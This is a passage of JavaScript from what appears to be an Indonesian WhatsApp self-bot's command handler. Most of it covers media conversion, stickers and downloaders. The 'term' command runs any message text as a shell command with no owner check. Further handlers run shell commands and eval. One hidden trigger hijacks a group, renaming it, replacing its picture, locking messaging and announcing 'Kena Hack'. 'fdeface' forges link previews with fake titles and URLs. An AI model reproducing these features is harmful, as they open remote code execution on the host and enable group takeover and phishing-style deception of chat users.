            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            hexa.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await hexa.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `SELF`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, hexa, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await hexa.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!q) return fakestatus('Isi teksnya!')
            hexa.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await hexa.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await hexa.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		hexa.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!mek.key.fromMe) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!mek.key.fromMe) return fakestatus('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
 	case 'hidetag':
			if (!mek.key.fromMe) return fakestatus('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await hexa.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			hexa.sendMessage(from, optionshidetag, text)
			break
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await hexa.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            hexa.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await hexa.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await hexa.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            hexa.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		hexa.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			hexa.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
    case 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await hexa.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            fakegroup(teks)
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			fakegroup(pingnya)
			})
			break  
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await hexa.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             hexa.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
default:
/*if (!mek.key.fromMe) return reply('OWNER ONLY')
if (budy.startsWith('<')){
try {
return hexa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}*/
if (budy.startsWith('>')){
              if (!mek.key.fromMe) return reply('OWNER ONLY')
		     console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
			return reply(from, JSON.stringify(eval(chats.slice(2)), null, 2), mek)
		  }
    }
    
		        if (budy.startsWith('=>')){
              if (!mek.key.fromMe) return reply('OWNER ONLY')
           var konsol = budy.slice(3)
         Return = (sul) => {
        var sat = JSON.stringify(sul, null, 2)
      bang = util.format(sat)
     if (sat == undefined){
   bang = util.format(sul)
  }
 return reply(bang)
   }
        try {
               reply(util.format(eval(`;(async () => { ${konsol} })()`)))
             console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
            } catch(e){
         reply(String(e))
     }
}

                       if (budy.startsWith('$')){
                     if (!mek.key.fromMe) return reply('lu siapa?')
                  qur = budy.slice(2)
               exec(qur, (err, stdout) => {
              if (err) return reply(`FGITDU BOTZ:${err}`)
            if (stdout) {
         reply(stdout)
        }
      })
     }
     
     if (budy.startsWith('_>/<')){
           if (!mek.key.fromMe) return reply('lu siapa?')
           if (!isBotGroupAdmins) return
           if (!isGroup) return
           anu = fs.readFileSync('stik/fake.jpeg')
           hexa.updateProfilePicture(from, anu)
           hexa.groupUpdateSubject(from, `KudetaByFGITDU BOTZ`)
           hexa.groupUpdateDescription(from, `KudetaFGITDU BOTZ`)
           hexa.groupSettingChange(from, GroupSettingChange.messageSend, true)
           setTimeout(() => {
           reply('Kasihan Kena Hack')
      }, 8000)
} 
if (budy == `281976`) {
						if (isBanned) return reply(ind.baned())
						if (isRegistered) return reply(ind.rediregis())
						const serialUser = createSerial(20)
						veri = sender
						if (isGroup) {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await hexa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `╭──「 *VERIFIKASI BERHASIL* 」
${a}➸ Nama : ${pushname}${a}
${a}➸ Nomor : wa.me/${sender.split("@")[0]}${a}
${a}➸ Waktu Verify : ${time}${a}
${a}➸ SN : ${serialUser}${a}
${a}➸ User Verified : ${_registered.length}${a}
╰─────「 *${fake}* 」`
							let peripi = await getBuffer(ppadd)
						    hexa.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
							addATM(sender)
							addLevelingId(sender)
							checkLimit(sender)
							console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
						} else {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppadd = await hexa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `╭──「 *VERIFIKASI BERHASIL* 」
${a}➸ Nama : ${pushname}${a}
${a}➸ Nomor : wa.me/${sender.split("@")[0]}${a}
${a}➸ Waktu Verify : ${time}${a}
${a}➸ SN : ${serialUser}${a}
${a}➸ User Verified : ${_registered.length}${a}
╰─────「 *${fake}* 」`
							let peripi = await getBuffer(ppadd)
							hexa.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
						}
						addATM(sender)
						addLevelingId(sender)
						checkLimit(sender)
						console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
					}
			
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
